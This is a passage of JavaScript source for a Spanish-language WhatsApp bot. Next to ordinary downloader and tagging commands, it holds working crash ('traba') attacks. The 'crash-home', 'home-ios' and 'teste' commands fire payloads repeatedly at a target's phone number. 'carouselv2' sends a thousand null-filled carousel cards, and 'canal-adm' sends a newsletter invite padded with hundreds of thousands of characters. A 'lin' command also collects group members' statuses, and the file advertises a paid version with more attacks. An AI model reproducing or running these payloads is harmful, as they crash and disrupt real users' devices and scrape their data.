footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
buttons: [
  { buttonId: 'sekzo', buttonText: { displayText: sekzo3 }, type: 10 },
  { buttonId: 'sekzo2', buttonText: { displayText: sekzo3}, type: 10 },
  { buttonId: 'sekzo34', buttonText: { displayText: sekzo3 }, type: 10 },
  { buttonId: 'sekzo4', buttonText: { displayText: sekzo3 }, type: 10 },
],
headerType: 1,
viewOnce: true
});
break; 
case "teste2": {
  if (!isBot && !isCreator) return;

  await SqlCaraosel(conn, from);
  await SqlCaraosel(conn, from);

  conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case "teste": {
    if (!isBot && !isCreator) return;

    let jid = m.mentionedJid && m.mentionedJid.length > 0
        ? m.mentionedJid[0]
        : m.quoted
            ? m.quoted.sender
            : (q ? q.replace(/[^0-9]/g, '') : null);

    if (!jid) return reply(" Ingresa un número válido.");

    let target = jid.includes('@s.whatsapp.net') ? jid : jid + "@s.whatsapp.net";
    if (candList.includes(target)) {
        //kkkkk
        await conn.sendMessage(m.chat, { 
            text: `Nel, con el owner no ` 
        }, { quoted: m });
        await conn.sendMessage("593969533280@s.whatsapp.net", { 
            text: `User *${m.sender}* intentó follar a ${target}.`
        });
        return;
    }
    SqlCaraosel(conn, jid)
    SqlCaraosel(conn, jid)
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case "crash-home": {
    if (!isBot && !isCreator) return;

    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
        ? m.mentionedJid[0]
        : m.quoted
            ? m.quoted.sender
            : (q ? q.replace(/[^0-9]/g, '') : null);

    if (!pelaku) return reply(" Ingresa un número válido.");

    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
    if (candList.includes(target)) {
        //kkkkk
        await conn.sendMessage(m.chat, { 
            text: `Nel, con el owner no ` 
        }, { quoted: m });
        await conn.sendMessage("593969533280@s.whatsapp.net", { 
            text: `User *${m.sender}* intentó follar a ${target}.`
        });
        return;
    }
    mikirKidz(conn, target);
    mikirKidz(conn, target);
    mikirKidz(conn, target);
    mikirKidz(conn, target);

    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case 'ig': {
    if (!q) return reply('⚠️ Ingresa el enlace de Instagram');
    try {
        const apiUrl = `https://api.nexfuture.com.br/api/downloads/instagram/dl?url=${encodeURIComponent(q)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`Error en la API: ${response.status}`);
        const json = await response.json();

        if (!json.status || !json.resultado || !json.resultado.data) {
            return reply('❌ No se pudo descargar el video');
        }

        // Recorremos los resultados (pueden ser varios)
        for (let item of json.resultado.data) {
            const { url, thumbnail } = item;
            await conn.sendMessage(from, { 
                video: { url }, 
                caption: `✅ Aquí está tu video de Instagram`,
                jpegThumbnail: thumbnail ? await (await fetch(thumbnail)).buffer() : null
            }, { quoted: m });
        }
    } catch (err) {
        console.error(err);
        reply('Error');
    }
}
break;
case 'play': {
    if (!q) return reply('`Ingresa el nombre de la canción`');
    try {
        const apiUrl = `https://api.nexfuture.com.br/api/downloads/youtube/play?query=${encodeURIComponent(q)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`Error en la API: ${response.status}`);
        const ñiñi = await response.json();
        if (!ñiñi.status || !ñiñi.resultado) return reply('No se encontraron resultados');
        const { imagem, titulo, desc, tempo, views, audio } = ñiñi.resultado;
        const caption = `> *Título:* ${titulo}\n> *Duración:* ${tempo}\n> *Vistas:* ${views}\n> *Descripción:* ${desc}\n\n\`_Enviando audio..._\``;
        await conn.sendMessage(from, { 
            image: { url: imagem }, 
            caption 
        }, { quoted: m });
        
        // Modificación aquí para descargar el audio correctamente
        const audioResponse = await fetch(audio);
        if (!audioResponse.ok) throw new Error('Error al descargar el audio');
        const audioBuffer = await audioResponse.arrayBuffer();
        const mp3 = path.join(__dirname, `./tempo/${titulo}_${Date.now()}.mp3`);
        const opus = path.join(__dirname, `./tempo/${titulo}_${Date.now()}.opus`);
        
        fs.writeFileSync(mp3, Buffer.from(audioBuffer));
        const { execSync } = require('child_process');
        execSync(`ffmpeg -i "${mp3}" -vn -c:a libopus -b:a 128k "${opus}"`);
        
        await conn.sendMessage(from, { 
            audio: fs.readFileSync(opus), 
            mimetype: 'audio/ogg; codecs=opus', 
            ptt: false
        }, { quoted: m });

        // Limpieza de archivos temporales
        setTimeout(() => {
            try {
                if (fs.existsSync(mp3)) fs.unlinkSync(mp3);
                if (fs.existsSync(opus)) fs.unlinkSync(opus);
            } catch (err) {
                console.error('Error al limpiar archivos temporales:', err);
            }
        }, 2 * 60 * 1000);

    } catch (err) {
        console.error(err);
        reply(`Error al procesar la solicitud`);
    }
}
break;
case 'idgroup': {
  try {
    const groups = await conn.groupFetchAllParticipating();
    const groupJids = Object.keys(groups);

    const jidDestino = m.chat || m.key?.remoteJid;

    if (groupJids.length === 0) {
      await conn.sendMessage(jidDestino, { text: '❌' }, { quoted: choco });
      break;
    }

    // Listamos Nombre + ID
    let lines = [];
    groupJids.forEach((jid, i) => {
      const subject = groups[jid]?.subject || "Grupo sin nombre";
      lines.push(`${i + 1}. \`${subject}\` — ${jid}`);
    });

    const text = ` *ID (${lines.length}):*\n\n` + lines.join('\n');

    if (text.length > 2000) {
      const buffer = Buffer.from(text, 'utf-8');
      await conn.sendMessage(jidDestino, {
        document: buffer,
        fileName: 'idgroups.txt',
        mimetype: 'text/plain'
      }, { quoted: choco });
    } else {
      await conn.sendMessage(jidDestino, { text }, { quoted: choco });
    }
  } catch (err) {
    console.error(err);
    const jidDestino = m.chat || m.key?.remoteJid;
    await conn.sendMessage(jidDestino, { text: '⚠️ Ocurrió un error al listar los grupos.' }, { quoted: choco });
  }
  break;
}

case 'tt':
case 'tiktok': {
    if (!q) return reply('*Ingresa el enlace del video de tiktok');
    try {
        const apiUrl = `https://api.dorratz.com/v2/tiktok-dl?url=${encodeURIComponent(q)}`;
        const noze = await fetch(apiUrl);
        if (!noze.ok) throw new Error(`Error API ${noze.status}`);
        const json = await noze.json();
        if (!json.status || !json.data) return reply('No se encontró el video.');
        const { title, duration, repro, like, share, comment, author, music, media } = json.data;
        const caption = `
> *Título:* \`${title}\`
> *Autor:* ${author.nickname} (${author.username})
> *Música:* ${music.title}
> *Duración:* ${duration}s
> *Reproducciones:* ${repro}
> *Likes:* ${like}
> *Comentarios:* ${comment}
> *Compartidos:* ${share}
        `;
const urlx = media.hd || media.org;
await conn.sendMessage(from, { 
    video: { url: urlx }, 
       caption: caption.trim()
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        reply('Error');
    }
}
break;

case "home-ios": {
    if (!isBot && !isCreator) return;

    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
        ? m.mentionedJid[0]
        : m.quoted
            ? m.quoted.sender
            : (q ? q.replace(/[^0-9]/g, '') : null);

    if (!pelaku) return reply(" Ingresa un número válido.");

    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
    if (candList.includes(target)) {
        //kkkkk
        await conn.sendMessage(m.chat, { 
            text: `Nel, con el owner no ` 
        }, { quoted: m });
        await conn.sendMessage("593969533280@s.whatsapp.net", { 
            text: `User *${m.sender}* intentó follar a ${target}.`
        });
        return;
    }
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case 'catalogo-ios':{
if (!isBot && !isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/ola.jpg') }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": "🎠" + cataui,
"description": cataui,
"currencyCode": `BRL`,
"footerText": cataui,
"priceAmount1000": "1000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000000000",
"retailerId": ` `,
"url": "wa.me/9473839229292"
},
"businessOwnerJid": "526421147692@s.whatsapp.net",
}
}), { userJid: from })
conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
}
break 
case "carouselv2": {
if (!isBot && !isCreator) return
let haxxn = 10;

for (let i = 0; i < haxxn; i++) {
let push = [];
let buttt = [];

for (let i = 0; i < 5; i++) {
buttt.push({
    "name": "galaxy_message",
    "buttonParamsJson": JSON.stringify({
    "header": "null",
    "body": "xxx",
    "flow_action": "navigate",
    "flow_action_payload":{ screen: "FORM_SCREEN" },
    "flow_cta": "Grattler",
    "flow_id": "1169834181134583",
    "flow_message_version":"3",
"    flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
})
},
)}
for (let i = 0; i < 1000; i++) {
push.push({
    "body": {
        "text": `\u0000\u0000\u0000\u0000\u0000`
    },
    "footer": {
        "text": ""
    },
      "header": {
        "title": '⃕͜By : 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 & 『』\u0000\u0000\u0000\u0000',
        "hasMediaAttachment": true,
  "imageMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
    "mimetype": "image/jpeg",
    "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
    "fileLength": "591",
    "height": 0,
    "width": 0,
    "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
    "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
    "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1721344123",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
    "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
    "scanLengths": [
      247,
      201,
      73,
      63
    ],
    "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
  }

      },
      "nativeFlowMessage": {
"buttons": [

]
      }
    });
  }

const carousel = generateWAMessageFromContent(from, {
"viewOnceMessage": {
"message": {
"messageContextInfo": {
    "deviceListMetadata": {},
    "deviceListMetadataVersion": 2
},
"interactiveMessage": {
    "body": {
        "text": '\u0000\u0000\u0000\u0000'
    },
    "footer": {
        "text": "¿Kkkkkk?"
    },
    "header": {
        "hasMediaAttachment": false
    },
    "carouselMessage": {
        "cards": [
        ...push
        ]
    },
}
}
}
}, {});

  await conn.relayMessage(from, carousel.message, {
    messageId: carousel.key.id
  });
}
}
break


case "lin":
if (!isBot && !isCreator) return
    {
      let resultText = "Infos:\n";
      if (m.isGroup) {
        for (const jid of participants) {
          await sleep(1000);
          let res = await conn.fetchStatus(jid.jid);
          let status = res[0]?.status.status || "";
          let setAt = res[0]?.status.setAt || "";
          let id = res[0]?.id || "";
        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
          await sleep(1000);
        }
        await conn.sendMessage(from, { text: resultText });
      } else {
        let res = await conn.fetchStatus(from);
        console.log(res);
        let status = res[0]?.status.status || "";
        let setAt = res[0]?.status.setAt || "";
        let id = res[0]?.id || "";
        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
        await conn.sendMessage(from, { text: resultText });
      }
    }
    break;

case 'tag':
    if (!m.isGroup) 
        return conn.sendMessage(m.chat, { text: 'Este comando solo funciona en grupos.' }, { quoted: m });
    let groupMetadata = await conn.groupMetadata(m.chat);
    let participants = groupMetadata.participants;
    let sender = m.sender;
    let yourNumber = '593969533280@s.whatsapp.net';
    let isAdmin = participants.find(p => p.id === sender)?.admin;
    if (!isAdmin && sender !== yourNumber) 
        return conn.sendMessage(m.chat, { text: 'Este comando solo lo pueden usar los administradores y el propietario del bot.' }, { quoted: m });
    let mencionado = participants.map(p => p.id);
    // Si responde a un mensaje, el bot lo repite con etiquetas
    if (m.quoted) {
        if (m.quoted.mtype === 'conversation' || m.quoted.mtype === 'extendedTextMessage') {
            await conn.sendMessage(m.chat, { text: m.quoted.text, mentions: mencionado });
        } else if (['stickerMessage', 'imageMessage', 'videoMessage', 'audioMessage'].includes(m.quoted.mtype)) {
            await conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: mencionado });
        } else {
            return conn.sendMessage(m.chat, { text: 'No puedo reenviar este tipo de mensaje.' });
        }
    } else {
        // Si el usuario usa #tag mensaje sin responder, envía el mensaje con etiquetas
        let mensaje = m.text.split(' ').slice(1).join(' ') || '👻';
        await conn.sendMessage(m.chat, { text: mensaje, mentions: mencionado });
    }
    break;
    case 'menu':
    if (!isBot && !isCreator) return 

    const os = require('os');
    const moment = require('moment-timezone');

    var deviceType = m.key.id.length > 21 ? 'Android' : m.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp Web';
    const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
    const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

  const menuzz = fs.readFileSync('./src/thumb.jpg');

    await conn.sendMessage(from, {
        image: { url: './src/foto.jpg' },
        contextInfo: {
            externalAdReply: {
                title: `𝐏.𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦`,
                body: '⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⿻⃟',
                mediaType: 4,
                thumbnail: menuzz,
                jpegThumbnail: menuzz,
                mediaUrl: 'https://youtube.com/@p.a.zinwebkkkkj',
                sourceUrl: 'https://whatsapp.com/channel/0029VaorTv7AzNbwdT52Rj2C'
            }
        },
        caption: `
╭⪫═════════════════⪫
│  ⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⃟
│  \`Usuario\`: ${pushname}
│  \`Hora:\` ${hora}
│  \`Fecha:\` ${data}
│  \`Estado:\` Online
│  \`Dispositivo:\` ${deviceType}
│  \`Plataforma:\` ${os.platform()}
│  \`HostName:\` ${os.hostname()}
╰═════════════════╯
  *LISTA DE COMANDOS*
  ANDORID
> crash-home 593xxx
> canal-adm
> carouselv2
  IOS 
> home-ios 593xxxx
> catalogo-ios 593xxx
  OTROS 
> lin
> tag`,
        footer: `𝐏 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
        buttons: [
            {
                buttonId: '..',
                buttonText: { displayText: '.' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⃟",
                        sections: [
                            {
                                title: "INFO",
                                rows: [
                                    {
                                        title: " 《 • INFO • 》",
                                        description: "⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⃟",
                                        id: `info`
                                    }
                                ]
                            }
                        ]
                    })
                }
            },
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: m });
break;
case 'info':
    await conn.sendMessage(from, {
        text: `
《 • INFO • 》
> By 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘
\`Versión:\` *FREE*
\`INFO:\` *Este es un bot gratuito por eso no cuentara con todas las funciones de paga*\n*Si quieres un bot completo con todas muchas más trabas puedes comprarlo aquí*: 
+52 642 114 7692
        `
    }, { quoted: choco });
break;

case "canal-adm":
const travas = `${"ꦾ".repeat(90000)}`
if (!isBot && !isCreator && !isNose) return
if (m.isGroup && groupid.includes(m.chat)) {
    return reply("❎❎❎❎");
}
conn.relayMessage(from,{"newsletterAdminInviteMessage":{"newsletterJid":"120363282786345717@newsletter","newsletterName":"🗣🗣🗣🗣" + travas + travas + travas ,"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAAoAAEBAQAAAAAAAAAAAAAAAAAAAQYBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAM4AAAgqCoAAAAAAAAAKBAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AJ//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AJ//Z","caption":"𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁","inviteExpiration":"1717872809"}},{})
conn.relayMessage(from,{extendedTextMessage: {text: `𝐏.𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘  ᶻ 𝗓 𐰁`}},{})
break

default:
}
} catch(e) {
console.log(e)
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})